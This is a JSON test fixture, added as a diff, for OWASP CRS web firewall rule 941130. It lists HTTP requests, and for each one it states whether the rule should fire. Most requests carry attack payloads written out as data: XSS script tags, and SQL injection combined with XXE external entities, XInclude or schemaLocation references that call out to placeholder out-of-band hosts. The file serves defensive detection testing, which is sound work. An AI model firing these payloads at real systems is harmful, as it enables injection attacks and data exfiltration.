@@ -1,0 +1,767 @@
+[
+  {
+    "name": "CRS 941130-1: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-2: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "215"
+      ]
+    ],
+    "body": "var=555-555-0199@example.com'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % lbsod SYSTEM \"http://im8vx9fw5e2ibzctphxn9vauwl2m0joncfz5nu.example'||'foo.bar/\">%lbsod;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-3: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "260"
+      ]
+    ],
+    "body": "var=%3Caai+xmlns%3D%22http%3A%2F%2Fa.b%2F%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+xsi%3AschemaLocation%3D%22http%3A%2F%2Fa.b%2F+http%3A%2F%2Fc5ipg3yqo8lcutvn8bghsptofflee424qxdq1f.examplefoo.bar%2Faai.xsd%22%3Eaai%3C%2Faai%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-4: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "195"
+      ]
+    ],
+    "body": "var=abcd'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % cgger SYSTEM \"http://ved8pm79xruv3c46hup01827oyuzxtlx9qwjk8.example'||'foo.bar/\">%cgger;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-5: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "193"
+      ]
+    ],
+    "body": "var=%3Cacp+xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude+href%3D%22http%3A%2F%2Fsgc5rj96zows5963jrrx3544qvwtnubvzomfa4.examplefoo.bar%2Ffoo%22%2F%3E%3C%2Facp%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-6: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "253"
+      ]
+    ],
+    "body": "var=/active/LFI/LFI-Detection-Evaluation-POST-200Valid/content.ini'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % grorj SYSTEM \"http://yikbtpbc1uyy7f89lxt35b6as1yw1qpudm0co1.example'||'foo.bar/\">%grorj;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-7: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "260"
+      ]
+    ],
+    "body": "var=%3Cafa+xmlns%3D%22http%3A%2F%2Fa.b%2F%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+xsi%3AschemaLocation%3D%22http%3A%2F%2Fa.b%2F+http%3A%2F%2F2mpfxtfg5y22bjcdp1x79faew52420q0er1hp6.examplefoo.bar%2Fafa.xsd%22%3Eafa%3C%2Fafa%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-8: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "260"
+      ]
+    ],
+    "body": "var=%3Cchj+xmlns%3D%22http%3A%2F%2Fa.b%2F%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+xsi%3AschemaLocation%3D%22http%3A%2F%2Fa.b%2F+http%3A%2F%2F1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar%2Fchj.xsd%22%3Echj%3C%2Fchj%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-9: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "203"
+      ]
+    ],
+    "body": "var=/content.ini'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % dwusu SYSTEM \"http://ehzrs5as0axe6v7pkdsj4r5qrhxcp6da12osch.example'||'foo.bar/\">%dwusu;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-10: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "201"
+      ]
+    ],
+    "body": "var=EmptyValue'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM \"http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/\">%awpsd;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-11: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "205"
+      ]
+    ],
+    "body": "var=file:/boot.ini'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % cwtpc SYSTEM \"http://gvft67ouecbgkxlryf6litjs5jbd5htlhd43ss.example'||'foo.bar/\">%cwtpc;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-12: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "254"
+      ]
+    ],
+    "body": "var=Matched Data: <!ENTITY % awfke SYSTEM found within ARGS_NAMES:1'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % awfke SYSTEM \"http://gj3tu7cu2czg8x9rmful6t7stjzcp4d812osch.example'||'foo.bar/\">%awfke;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-13: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "260"
+      ]
+    ],
+    "body": "var=%3Coez+xmlns%3D%22http%3A%2F%2Fa.b%2F%22+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22+xsi%3AschemaLocation%3D%22http%3A%2F%2Fa.b%2F+http%3A%2F%2Feygr95rshaeenvop1d9jlrmq8hegib6bu4hx5m.examplefoo.bar%2Foez.xsd%22%3Eoez%3C%2Foez%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-14: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "188"
+      ]
+    ],
+    "body": "var=(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % anwyn SYSTEM \"http://y98bkp2csupyyfz9cxk3wbxaj1pzuzi26vtohd.example'||'foo.bar/\">%anwyn;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-15: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "193"
+      ]
+    ],
+    "body": "var=%3Cvqk+xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude+href%3D%22http%3A%2F%2F749kfyxln3k7toui76fcrksjeak3nybzzsmlaa.examplefoo.bar%2Ffoo%22%2F%3E%3C%2Fvqk%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-16: XSS test for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "201"
+      ]
+    ],
+    "body": "var=2010-01-01'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % fhklu SYSTEM \"http://fzisa6stibffowpq2eakmsnr9ifhii6mueh45t.example'||'foo.bar/\">%fhklu;",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-17: FP test for 941130",
+    "method": "POST",
+    "uri": "/post/api/v1/query?q=7XMLNS",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "0"
+      ]
+    ],
+    "no_expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-18: XSS test with encoded newline for 941130",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "196"
+      ]
+    ],
+    "body": "var=<chj%0Axmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://1pre0sif8x51eifcs006ceddz45084w4kx7ovd.examplefoo.bar/chj.xsd\">chj</chj>",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-19: Status Test Page - simple test for 941130",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "foo!ENTITY % bar SYSTEM"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-20: True positive for `pattern` attribute",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "45"
+      ]
+    ],
+    "body": "var=%3Cinput+pattern%3D%22%5Ea+regex%24%22%3E",
+    "expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-21: False positive for `pattern` with `=` following at an arbitrary position later",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "130"
+      ]
+    ],
+    "body": "var=There%27s+a+pattern+in+the+dark+background.+Here%27s+a+video%3A+%3Ca+href%3D%5Cx22https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D",
+    "no_expect_ids": [
+      941130
+    ]
+  },
+  {
+    "name": "CRS 941130-22: GHSA: 941130 payload via XML attribute injection (verifies XML://@* coverage)",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Content-Type",
+        "application/xml"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "148"
+      ]
+    ],
+    "body": "<?xml version=\"1.0\"?><root><a probe=\"&lt;x:script xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot; src=&quot;data:,alert(1)&quot; /&gt;\"></a></root>",
+    "expect_ids": [
+      941130
+    ]
+  }
+]
